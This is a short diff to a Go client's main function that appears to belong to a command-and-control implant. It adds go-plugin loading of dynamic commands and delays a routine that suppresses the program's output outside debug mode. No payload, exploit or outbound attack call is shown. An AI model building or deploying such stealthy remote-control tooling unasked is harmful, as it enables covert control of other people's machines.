@@ -11,7 +11,10 @@ import (
 	httpFuncs "src/Client/beacon/http"
 	"src/Client/generic/config"
 	"src/Client/generic/logger"
+	"src/Client/generic/rpc_client"
 	"src/Client/session"
+
+	"github.com/hashicorp/go-plugin"
 )
 
 // --- Output Suppression Utility ---
@@ -96,12 +99,21 @@ func beacon() {
 }
 
 func main() {
-	if !config.IsDebug() {
-		suppressOutput()
-	} else {
+	// If debug, log; otherwise defer suppressing output until after plugin load
+	if config.IsDebug() {
 		logger.Warn("Debug mode enabled")
 	}
+
 	logger.Warn("Program Starting")
+
+	// Now suppress output (child plugin RPC uses inherited stdout/stderr)
+	if !config.IsDebug() {
+		suppressOutput()
+	}
+
+	// Print list of loaded dynamic commands
+	cmds := rpc_client.ListDynamicCommands()
+	logger.Log(fmt.Sprintf("Loaded dynamic commands: %v", cmds))
 
 	switch config.PrimaryConnectionMethod {
 	case "session":
@@ -115,4 +127,5 @@ func main() {
 		beacon()
 
 	}
+	plugin.CleanupClients()
 }
